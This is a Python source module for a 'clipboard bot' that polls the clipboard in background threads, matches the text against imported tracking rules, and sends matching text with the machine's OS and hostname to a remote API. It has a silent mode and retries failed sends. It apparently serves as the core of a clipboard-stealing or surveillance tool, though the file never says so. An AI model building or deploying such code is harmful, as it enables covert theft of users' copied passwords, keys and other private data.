from __future__ import annotations

import logging
import threading
import time

import pyperclip

from config import API_URL, BOT_VERSION, CLIPBOARD_POLL_INTERVAL, LOG_FILE, PAYLOAD_TYPE, PENDING_RETRY_INTERVAL
from client.api_client import flush_pending, ping_api, send_payload
from client.clipboard_watch import get_clipboard_sequence
from client.event_log import setup_logging
from client.os_detect import detect_os, get_hostname
from client.track_rules import describe_track_match, detect_track_match


class ClipboardMonitor:
    def __init__(self, silent: bool = False) -> None:
        self._silent = silent
        self._os = detect_os()
        self._hostname = get_hostname()
        self._last_text = ""
        self._last_sequence = get_clipboard_sequence()
        self._stop_event = threading.Event()
        self._clipboard_thread: threading.Thread | None = None
        self._retry_thread: threading.Thread | None = None

    def _build_payload(self, text: str) -> dict:
        return {
            "Type": PAYLOAD_TYPE,
            "os": self._os,
            "hostname": self._hostname,
            "Data": text,
        }

    def _should_track(self, text: str) -> bool:
        return detect_track_match(text) is not None

    def _handle_clipboard_text(self, text: str, *, force: bool = False) -> None:
        if not force and text == self._last_text:
            return
        self._last_text = text

        match_type = detect_track_match(text)
        if match_type is None:
            return

        payload = self._build_payload(text)
        logging.info("Tracked clipboard match: %s", describe_track_match(match_type))
        send_payload(payload)

    def _clipboard_loop(self) -> None:
        while not self._stop_event.is_set():
            try:
                sequence = get_clipboard_sequence()
                text = pyperclip.paste()
                if isinstance(text, str) and text:
                    sequence_changed = (
                        sequence is not None
                        and self._last_sequence is not None
                        and sequence != self._last_sequence
                    )
                    if sequence is not None:
                        self._last_sequence = sequence

                    if sequence_changed:
                        self._handle_clipboard_text(text, force=True)
                    else:
                        self._handle_clipboard_text(text)
            except pyperclip.PyperclipException as exc:
                logging.debug("Clipboard read skipped: %s", exc)
            except Exception as exc:
                logging.error("Unexpected clipboard error: %s", exc)

            self._stop_event.wait(CLIPBOARD_POLL_INTERVAL)

    def _retry_loop(self) -> None:
        while not self._stop_event.is_set():
            flush_pending()
            self._stop_event.wait(PENDING_RETRY_INTERVAL)

    def start(self) -> None:
        setup_logging(LOG_FILE, console=not self._silent)
        logging.info("Starting clipboard bot v%s on %s (%s)", BOT_VERSION, self._os, self._hostname)
        logging.info("API endpoint: %s", API_URL)

        if ping_api():
            logging.info("API reachable")
        else:
            logging.warning(
                "API is not reachable yet. Check the server is running or set CLIPBOARD_BOT_API_URL"
            )

        flush_pending()

        self._clipboard_thread = threading.Thread(
            target=self._clipboard_loop,
            name="clipboard-monitor",
            daemon=True,
        )
        self._retry_thread = threading.Thread(
            target=self._retry_loop,
            name="pending-retry",
            daemon=True,
        )

        self._clipboard_thread.start()
        self._retry_thread.start()

        try:
            while not self._stop_event.is_set():
                time.sleep(1)
        except KeyboardInterrupt:
            self.stop()

    def stop(self) -> None:
        logging.info("Stopping clipboard bot")
        self._stop_event.set()
